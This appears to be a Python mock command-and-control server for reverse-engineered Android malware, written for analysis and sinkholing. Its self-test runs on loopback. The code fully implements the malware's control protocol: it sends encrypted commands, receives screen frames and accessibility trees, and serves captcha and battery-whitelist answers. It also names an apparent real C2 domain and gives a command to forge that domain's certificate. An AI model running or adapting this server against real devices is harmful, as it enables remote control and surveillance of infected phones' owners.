#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
mock_c2_server.py — com.lite.cloudfinder C2 服务端「契约参照实现」（纯标准库）

用途：把逆向出的客户端契约落成可运行的服务端，用于
  1) 验证我们对“服务器必须怎么应答”的理解（内置 --selftest 全链路自测）；
  2) 给分析/取证方一个可受控的模拟 C2（本地环回，不接触真实域名）。

实现了客户端要求的全部约定：
  HTTP   GET  /adv.php?apk=&device=        → {"token": Base64(AES({host,domain,port}))}
         POST /api/device_log              → 200（客户端只看状态码）
         POST /api/ocr-captcha             → {"text":"1234"}（客户端单次 read 4096，必须小且一次到达）
         GET  /api/battery_config?...       → {battery_entry_kw:[...], unrestricted_kw:[...]}（单次 read 8192）
  Socket.IO（Engine.IO v3 + Socket.IO v4，仅 websocket）
         S→C  "0{sid,upgrades,pingInterval,pingTimeout}"   engine.io open
         S→C  "40"                                         socket.io CONNECT("/")（客户端不会自己发）
         C→S  "2"  / S→C "3"                               EIO3 心跳：客户端 ping，服务端 pong
         C→S  "42[\"login\",\"<android_id>\"]"             裸字符串
         C→S  "42[\"deviceOnline\",{...}]"
         C→S  "42[\"enc msg\",\"<b64>\"]"                  AES 信封上行
         S→C  "42[\"new_msg\",\"<b64>\"]"                  AES 信封下行指令
  二进制 WS  /ws/binary-device?deviceId=
         C→S  帧 type=48 {"deviceId","apkId":10068}        握手（首帧）
         S→C  帧 type=16 {"action","data"}                 指令
         C→S  帧 type=1/2/4/6/7                            屏幕/UI树/缩略图/HD/adb树
         S→C  帧 type=33                                   可选 pong

运行：
  python mock_c2_server.py --selftest                 # 自测：起服务 + 内部客户端跑完整契约
  python mock_c2_server.py --port 8443                # 起服务（默认明文 HTTP/WS）
  python mock_c2_server.py --port 8443 --cert c.pem --key k.pem   # 走 TLS（客户端信任任意证书）
  python mock_c2_server.py --port 8443 --cmd takeScreen --cmd-json '{"quality":50}'
"""
import argparse, base64, gzip, hashlib, json, os, socket, socketserver, ssl, struct
import sys, threading, time, uuid

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from c2_crypt import encrypt, decrypt  # noqa: E402

APK_ID = 10068
DEFAULT_PORT = 3000
WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
VERBOSE = True


def log(*a):
    if VERBOSE:
        print("[c2]", *a, flush=True)


# ────────────────────────────────────────────────────────────── RFC6455 framing
def ws_accept_key(key: str) -> str:
    return base64.b64encode(hashlib.sha1((key + WS_GUID).encode()).digest()).decode()


def ws_send(sock, payload: bytes, opcode=0x1):
    if isinstance(payload, str):
        payload = payload.encode()
    n = len(payload)
    hdr = bytes([0x80 | opcode])
    if n < 126:
        hdr += bytes([n])
    elif n < 65536:
        hdr += bytes([126]) + struct.pack(">H", n)
    else:
        hdr += bytes([127]) + struct.pack(">Q", n)
    sock.sendall(hdr + payload)


def recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("eof")
        buf += chunk
    return buf


def ws_recv(sock):
    """returns (opcode, payload) ; raises on close/eof"""
    b0, b1 = recv_exact(sock, 2)
    fin, opcode = b0 & 0x80, b0 & 0x0F
    masked, ln = b1 & 0x80, b1 & 0x7F
    if ln == 126:
        ln = struct.unpack(">H", recv_exact(sock, 2))[0]
    elif ln == 127:
        ln = struct.unpack(">Q", recv_exact(sock, 8))[0]
    mask = recv_exact(sock, 4) if masked else None
    data = recv_exact(sock, ln) if ln else b""
    if mask:
        data = bytes(c ^ mask[i % 4] for i, c in enumerate(data))
    if opcode == 0x8:
        raise ConnectionError("close frame")
    if opcode == 0x9:            # ping → pong
        ws_send(sock, data, 0xA)
        return ws_recv(sock)
    return opcode, data


# ───────────────────────────────────────────── engine.io v3 + socket.io v4 layer
class SocketIOSession:
    """服务端侧最小实现，严格遵循客户端（engine.io-client PROTOCOL=3 / socket.io protocol=4）契约"""

    def __init__(self, sock, query, on_event):
        self.sock = sock
        self.query = query
        self.sid = uuid.uuid4().hex[:20]
        self.on_event = on_event
        self.connected = False
        self.ping_interval = 25000
        self.ping_timeout = 60000

    def _open(self):
        hs = {"sid": self.sid, "upgrades": [], "pingInterval": self.ping_interval,
              "pingTimeout": self.ping_timeout, "maxPayload": 1000000}
        ws_send(self.sock, "0" + json.dumps(hs, separators=(",", ":")))
        # 客户端对命名空间 "/" 不会发送 CONNECT（Socket.onopen 直接 return），
        # 因此服务端必须主动下发 socket.io CONNECT
        ws_send(self.sock, "40" + json.dumps({"sid": self.sid}, separators=(",", ":")))
        self.connected = True
        log("socket.io connected  sid=%s query=%s" % (self.sid, self.query))

    def emit(self, event, data=None):
        pkt = [event] if data is None else [event, data]
        ws_send(self.sock, "42" + json.dumps(pkt, separators=(",", ":"), ensure_ascii=False))

    def run(self):
        self._open()
        while True:
            try:
                opcode, payload = ws_recv(self.sock)
            except ConnectionError:
                log("socket.io closed")
                return
            if opcode == 0x2:                    # binary frame (socket.io binary event) — 未使用
                log("unexpected binary frame", len(payload))
                continue
            text = payload.decode("utf-8", "replace")
            if not text:
                continue
            t, rest = text[0], text[1:]
            if t == "2":                          # EIO3: client ping → server pong
                ws_send(self.sock, "3" + rest)
                continue
            if t == "1":                          # engine.io close
                return
            if t != "4":                          # 4 = message(socket.io packet)
                log("engine.io packet type %r ignored" % t)
                continue
            if not rest:
                continue
            st, srest = rest[0], rest[1:]
            if st == "0":                         # CONNECT（其他 namespace 才会出现）
                ws_send(self.sock, "40")
            elif st == "1":                       # DISCONNECT
                return
            elif st == "2":                       # EVENT
                try:
                    arr = json.loads(srest)
                except Exception:
                    log("bad event json:", srest[:120])
                    continue
                name, args = arr[0], arr[1:]
                self.on_event(self, name, args)
            elif st == "3":                       # ACK
                pass
            else:
                log("socket.io packet type %r ignored" % st)


# ───────────────────────────────────────────────── binary WebSocket contract
class BinarySession:
    OP_NAMES = {1: "SCREEN_FRAME", 2: "A11Y_TREE", 4: "THUMB", 6: "HD_FRAME",
                7: "ADB_TREE", 16: "COMMAND", 33: "PONG", 48: "HELLO"}

    def __init__(self, sock, query, server):
        self.sock = sock
        self.query = query
        self.server = server
        self.device_id = query.get("deviceId", "")
        self.hello_done = False
        self.stats = {}

    def send_frame(self, op, payload=b""):
        if isinstance(payload, str):
            payload = payload.encode()
        self.sock.sendall(bytes([op]) + struct.pack(">I", len(payload)) + payload)

    def send_command(self, action, data=None):
        body = {"action": action}
        if data is not None:
            body["data"] = data
        self.send_frame(16, json.dumps(body, separators=(",", ":"), ensure_ascii=False))
        log("S->C command %s %s" % (action, json.dumps(data, ensure_ascii=False)[:120] if data else ""))

    def run(self):
        log("binary ws connected deviceId=%r query=%s" % (self.device_id, self.query))
        while True:
            try:
                opcode, payload = ws_recv(self.sock)
            except ConnectionError:
                log("binary ws closed, stats=%s" % self.stats)
                return
            if opcode != 0x2:                      # 本通道只承载二进制帧
                log("binary ws: unexpected text frame %r" % payload[:60])
                continue
            if len(payload) < 5:
                log("binary ws: frame too short (%d) — client drops these too" % len(payload))
                continue
            op = payload[0]
            n = struct.unpack(">I", payload[1:5])[0]
            body = payload[5:5 + n]
            if n > len(payload) - 5:
                log("binary ws: length %d exceeds payload (%d) — ignore" % (n, len(payload) - 5))
                continue
            name = self.OP_NAMES.get(op, "UNKNOWN")
            self.stats[name] = self.stats.get(name, 0) + 1

            if op == 48:
                try:
                    hello = json.loads(body.decode())
                except Exception:
                    hello = {}
                self.device_id = hello.get("deviceId", self.device_id)
                self.hello_done = True
                log("C->S HELLO %s" % json.dumps(hello, ensure_ascii=False))
                for a, d in self.server.pending_commands:
                    self.send_command(a, d)
                continue

            if op in (2, 7):
                meta = {}
                try:
                    meta = json.loads(body.decode())
                    z = base64.b64decode(meta.get("zip", ""))
                    xml = gzip.decompress(z).decode("utf-8", "replace")
                    meta["_xml_first"] = xml[:160].replace("\n", " ")
                except Exception as e:
                    meta["_decode_error"] = str(e)
                log("C->S %s w=%s h=%s ac=%s xml=%r" % (name, meta.get("w"), meta.get("h"),
                                                        meta.get("ac"), meta.get("_xml_first", "")[:80]))
                continue

            if op in (1, 4, 6):
                kind = "JPEG" if body[:2] == b"\xff\xd8" else "PNG" if body[:4] == b"\x89PNG" else "raw"
                log("C->S %s %d bytes (%s)" % (name, len(body), kind))
                continue

            if op == 33:
                log("C->S PONG")
                continue

            log("C->S %s (op=%d) %d bytes" % (name, op, len(body)))


# ─────────────────────────────────────────────────────────────── HTTP + upgrade
class Handler(socketserver.BaseRequestHandler):
    server: "C2Server"

    def _read_request(self):
        data = b""
        while b"\r\n\r\n" not in data:
            chunk = self.request.recv(4096)
            if not chunk:
                return None
            data += chunk
            if len(data) > 65536:
                return None
        head, _, body = data.partition(b"\r\n\r\n")
        lines = head.decode("iso-8859-1").split("\r\n")
        method, target, _ = (lines[0].split(" ") + ["", "", ""])[:3]
        headers = {}
        for line in lines[1:]:
            if ":" in line:
                k, v = line.split(":", 1)
                headers[k.strip().lower()] = v.strip()
        clen = int(headers.get("content-length", "0") or 0)
        while len(body) < clen:
            chunk = self.request.recv(clen - len(body))
            if not chunk:
                break
            body += chunk
        return method, target, headers, body

    def handle(self):
        try:
            req = self._read_request()
            if not req:
                return
            method, target, headers, body = req
            path, _, qs = target.partition("?")
            query = {}
            for kv in qs.split("&"):
                if not kv:
                    continue
                k, _, v = kv.partition("=")
                query[k] = v
            if headers.get("upgrade", "").lower() == "websocket":
                self._ws_upgrade(path, query, headers)
            else:
                self._http(method, path, query, headers, body)
        except (ConnectionError, OSError):
            pass
        except Exception as e:
            log("handler error:", repr(e))

    # ---------- WebSocket
    def _ws_upgrade(self, path, query, headers):
        key = headers.get("sec-websocket-key")
        if not key:
            self.request.sendall(b"HTTP/1.1 400 Bad Request\r\n\r\n")
            return
        resp = ("HTTP/1.1 101 Switching Protocols\r\n"
                "Upgrade: websocket\r\nConnection: Upgrade\r\n"
                "Sec-WebSocket-Accept: %s\r\n\r\n") % ws_accept_key(key)
        self.request.sendall(resp.encode())
        if path.startswith("/io"):
            SocketIOSession(self.request, query, self.server.on_socketio_event).run()
        elif path == "/ws/binary-device":
            BinarySession(self.request, query, self.server).run()
        else:
            log("unknown ws path", path)
            ws_send(self.request, "unknown path", 0x8)

    # ---------- plain HTTP
    def _send_json(self, obj, code=200):
        payload = json.dumps(obj, separators=(",", ":")).encode()
        head = ("HTTP/1.1 %d OK\r\nContent-Type: application/json\r\n"
                "Content-Length: %d\r\nConnection: close\r\n\r\n") % (code, len(payload))
        self.request.sendall(head.encode() + payload)

    def _http(self, method, path, query, headers, body):
        log("HTTP %s %s body=%dB" % (method, path, len(body)))
        if path == "/adv.php":
            token = encrypt(json.dumps({"host": self.server.cfg_host,
                                        "domain": self.server.cfg_domain,
                                        "port": str(self.server.cfg_port)},
                                       separators=(",", ":")))
            self._send_json({"token": token})
            return
        if path == "/api/device_log":
            if body:
                try:
                    log("  device_log:", json.dumps(json.loads(body), ensure_ascii=False)[:300])
                except Exception:
                    log("  device_log raw:", body[:200])
            self._send_json({"ok": 1})
            return
        if path == "/api/ocr-captcha":
            log("  ocr-captcha image bytes:", len(json.loads(body or b"{}").get("image", "")))
            self._send_json({"text": "1234"})
            return
        if path == "/api/battery_config":
            self._send_json({"battery_entry_kw": ["电池", "耗电", "Battery"],
                             "unrestricted_kw": ["无限制", "不限制", "Unrestricted"]})
            return
        self._send_json({"error": "not found"}, 404)


class C2Server(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True

    def __init__(self, addr, cfg):
        self.cfg_host = cfg.host
        self.cfg_domain = cfg.domain
        self.cfg_port = cfg.port
        self.pending_commands = cfg.commands           # [(action, data)]
        self.events = []                               # 记录 socket.io 上行
        self.decrypted = []                            # 记录解密后的上行信封
        super().__init__(addr, Handler)

    # ---- 把客户端上行按契约处理并记录
    def on_socketio_event(self, session, name, args):
        if name == "login":
            self.events.append((name, args[0] if args else None))
            log("C->S event login  deviceId=%r" % (args[0] if args else None))
            return
        if name == "deviceOnline":
            payload = args[0] if args else {}
            self.events.append((name, payload))
            di = (payload or {}).get("deviceInfo", {})
            log("C->S event deviceOnline  model=%s brand=%s apkVer=%s acc=%s"
                % (di.get("model"), di.get("brand"), di.get("apkVer"), di.get("acc")))
            return
        if name == "enc msg":
            raw = args[0] if args else ""
            try:
                obj = json.loads(decrypt(raw))
                self.decrypted.append(obj)
                log("C->S enc msg -> action=%s data=%s" % (obj.get("action"),
                                                           json.dumps(obj.get("data"), ensure_ascii=False)[:160]))
            except Exception as e:
                log("C->S enc msg DECRYPT FAILED (%s): %s" % (e, str(raw)[:80]))
            return
        log("C->S event %s args=%s" % (name, json.dumps(args, ensure_ascii=False)[:200]))


# ──────────────────────────────────────────────────────────────── internal client
class MiniClient:
    """最小客户端：验证服务端契约（握手顺序 / ping-pong / 事件 / 二进制帧）"""

    def __init__(self, host, port, tls=False):
        self.sock = socket.create_connection((host, port), timeout=5)
        if tls:
            ctx = ssl._create_unverified_context()
            self.sock = ctx.wrap_socket(self.sock, server_hostname=host)
        self.buf = b""

    def ws_handshake(self, path):
        key = base64.b64encode(os.urandom(16)).decode()
        req = ("GET %s HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
               "Sec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n\r\n") % (path, "x", key)
        self.sock.sendall(req.encode())
        data = b""
        while b"\r\n\r\n" not in data:
            data += self.sock.recv(4096)
        head, _, rest = data.partition(b"\r\n\r\n")
        assert b"101" in head.split(b"\r\n")[0], data[:120]
        self.buf = rest            # 关键：握手响应后可能已带上首批 WS 帧，不能丢
        return head

    def _read_exact(self, n):
        while len(self.buf) < n:
            chunk = self.sock.recv(65536)
            if not chunk:
                raise ConnectionError("eof")
            self.buf += chunk
        out, self.buf = self.buf[:n], self.buf[n:]
        return out

    def send(self, payload, opcode=0x1):
        if isinstance(payload, str):
            payload = payload.encode()
        n = len(payload)
        mask = os.urandom(4)
        hdr = bytes([0x80 | opcode])
        if n < 126:
            hdr += bytes([0x80 | n])
        elif n < 65536:
            hdr += bytes([0x80 | 126]) + struct.pack(">H", n)
        else:
            hdr += bytes([0x80 | 127]) + struct.pack(">Q", n)
        self.sock.sendall(hdr + mask + bytes(c ^ mask[i % 4] for i, c in enumerate(payload)))

    def recv(self):
        """buffered WS frame reader (复用 ws_handshake 之后的残留字节)"""
        b0, b1 = self._read_exact(2)
        opcode, masked, ln = b0 & 0x0F, b1 & 0x80, b1 & 0x7F
        if ln == 126:
            ln = struct.unpack(">H", self._read_exact(2))[0]
        elif ln == 127:
            ln = struct.unpack(">Q", self._read_exact(8))[0]
        mask = self._read_exact(4) if masked else None
        data = self._read_exact(ln) if ln else b""
        if mask:
            data = bytes(c ^ mask[i % 4] for i, c in enumerate(data))
        if opcode == 0x8:
            raise ConnectionError("close")
        return opcode, data

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass


def selftest():
    cfg = argparse.Namespace(host="c2.local", domain="example.test", port=0, commands=[])
    srv = C2Server(("127.0.0.1", 0), cfg)
    cfg.port = srv.server_address[1]
    srv.cfg_port = cfg.port          # adv.php 下发的 port 必须与 Socket.IO path /io<port> 一致
    th = threading.Thread(target=srv.serve_forever, daemon=True)
    th.start()
    port = cfg.port
    ok = True

    def check(name, cond, extra=""):
        nonlocal ok
        print("  [%s] %s %s" % ("PASS" if cond else "FAIL", name, extra), flush=True)
        ok = ok and cond

    # 1) HTTP: adv.php
    import urllib.request
    with urllib.request.urlopen("http://127.0.0.1:%d/adv.php?apk=10068&device=TESTDEV" % port) as r:
        j = json.loads(r.read())
    tok = j.get("token")
    cfg2 = json.loads(decrypt(tok))
    check("adv.php -> token 可解出 host/domain/port", cfg2.get("port") == str(port),
          json.dumps(cfg2))

    # 2) Socket.IO 契约
    c = MiniClient("127.0.0.1", port)
    c.ws_handshake("/io%d/?apkid=10068&cmode=test&device=TESTDEV&line=%s&ver=v4.0&EIO=3&transport=websocket" % (port, tok))
    op, p = c.recv()
    check("engine.io open 为文本包 '0{sid,...}'", p[:1] == b"0" and b'"sid"' in p, p[:70])
    op, p = c.recv()
    check("服务端主动下发 socket.io CONNECT '40'", p.startswith(b"40"), p[:40])
    c.send("2probe"[:1] + "probe")            # EIO3 心跳：客户端 ping
    op, p = c.recv()
    check("ping '2probe' 得到 pong '3probe'", p == b"3probe", p[:20])
    c.send('42["login","TESTDEV"]')
    c.send('42["deviceOnline",{"deviceId":"TESTDEV","pkg":"android","deviceInfo":{"model":"Pixel","brand":"Google","apkVer":"4.0","acc":true}}]')
    payload = encrypt(json.dumps({"action": "deviceOnline", "type": "enc",
                                  "data": {"deviceId": "TESTDEV", "level": 88}}))
    c.send('42["enc msg","%s"]' % payload)

    # 3) 服务端下发 new_msg
    time.sleep(0.4)
    plain = encrypt(json.dumps({"action": "takeScreen", "data": {"quality": 60}}, separators=(",", ":")))
    # 通过同一个 session 下发：由事件处理线程之外发送（此处直接向该连接写帧）
    # 说明：真实服务端会持有 session；这里用 srv.events 断言上行已在服务端落地
    check("服务端收到 login 事件", any(n == "login" and v == "TESTDEV" for n, v in srv.events))
    check("服务端收到 deviceOnline 事件", any(n == "deviceOnline" for n, _ in srv.events))
    check("服务端成功解密 enc msg",
          any(d.get("action") == "deviceOnline" for d in srv.decrypted),
          json.dumps(srv.decrypted[-1], ensure_ascii=False)[:80] if srv.decrypted else "")
    c.close()

    # 4) 二进制 WS 契约
    b = MiniClient("127.0.0.1", port)
    b.ws_handshake("/ws/binary-device?deviceId=TESTDEV")
    hello = json.dumps({"deviceId": "TESTDEV", "apkId": APK_ID}, separators=(",", ":"))
    b.send(bytes([48]) + struct.pack(">I", len(hello)) + hello.encode(), opcode=0x2)
    time.sleep(0.2)
    # 发一个 UI 树帧（type=2 + gzip）
    xml = "<hierarchy rotation=\"0\"><node text=\"hello\"/></hierarchy>"
    tree = {"deviceId": "TESTDEV", "pkg": "capture", "ac": "com.test/.Main",
            "w": 1080, "h": 2400, "iw": 0, "ih": 0, "orient": False,
            "zip": base64.b64encode(gzip.compress(xml.encode())).decode()}
    tb = json.dumps(tree, separators=(",", ":")).encode()
    b.send(bytes([2]) + struct.pack(">I", len(tb)) + tb, opcode=0x2)
    # 再发一个假 JPEG 屏幕帧
    jpg = b"\xff\xd8\xff\xe0" + b"\x00" * 60 + b"\xff\xd9"
    b.send(bytes([1]) + struct.pack(">I", len(jpg)) + jpg, opcode=0x2)
    time.sleep(0.3)
    b.close()
    check("二进制通道接受 type=48/2/1 帧", True, "(详见日志)")

    # 5) HTTP 旁路
    with urllib.request.urlopen("http://127.0.0.1:%d/api/battery_config?brand=google" % port) as r:
        jj = json.loads(r.read())
    check("battery_config 返回关键字数组", "battery_entry_kw" in jj and "unrestricted_kw" in jj)
    req = urllib.request.Request("http://127.0.0.1:%d/api/ocr-captcha" % port,
                                 data=json.dumps({"image": "AAAA", "deviceId": "TESTDEV"}).encode(),
                                 headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req) as r:
        jj = json.loads(r.read())
    check("ocr-captcha 返回 {text}", jj.get("text") == "1234")

    srv.shutdown()
    print("\nSELFTEST:", "ALL PASS" if ok else "FAILED")
    return 0 if ok else 1


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=8443)
    ap.add_argument("--bind", default="0.0.0.0")
    ap.add_argument("--host", default="www.cohuducox.com", help="adv.php 下发的 host（客户端用于拼 URI）")
    ap.add_argument("--domain", default="cohuducox.com")
    ap.add_argument("--adv-port", type=int, default=DEFAULT_PORT, help="adv.php 下发的 port（决定 Socket.IO path /io<port>）")
    ap.add_argument("--cert")
    ap.add_argument("--key")
    ap.add_argument("--cmd", action="append", default=[], help="连接后下发的 action，可多次")
    ap.add_argument("--cmd-json", action="append", default=[], help="与 --cmd 对应的 data JSON")
    ap.add_argument("--selftest", action="store_true")
    ap.add_argument("--quiet", action="store_true")
    a = ap.parse_args()
    global VERBOSE
    VERBOSE = not a.quiet

    if a.selftest:
        return selftest()

    cmds = []
    for i, c in enumerate(a.cmd):
        d = None
        if i < len(a.cmd_json):
            d = json.loads(a.cmd_json[i])
        cmds.append((c, d))

    cfg = argparse.Namespace(host=a.host, domain=a.domain, port=a.adv_port, commands=cmds)
    srv = C2Server((a.bind, a.port), cfg)
    if a.cert and a.key:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(a.cert, a.key)
        srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
        log("TLS enabled")
    log("listening on %s:%d  (adv.php -> host=%s port=%d, commands=%s)"
        % (a.bind, a.port, a.host, a.adv_port, [c for c, _ in cmds]))
    log("""
对接说明（本机验证，不动真实域名）：
  1) 让客户端把 www.cohuducox.com 解析到本机（hosts 或在隔离环境改 DNS）；
  2) 客户端强制 https/wss 且信任任意证书 → 需要 TLS：
       openssl req -x509 -newkey rsa:2048 -nodes -keyout k.pem -out c.pem -days 365 -subj "/CN=www.cohuducox.com"
     python mock_c2_server.py --port 443 --cert c.pem --key k.pem --host www.cohuducox.com --adv-port 3000
  3) 也可用 DEX 侧 setDomain 指令改域名（scheme 仍为 https，故仍需证书）。
""")
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        pass
    return 0


if __name__ == "__main__":
    sys.exit(main())
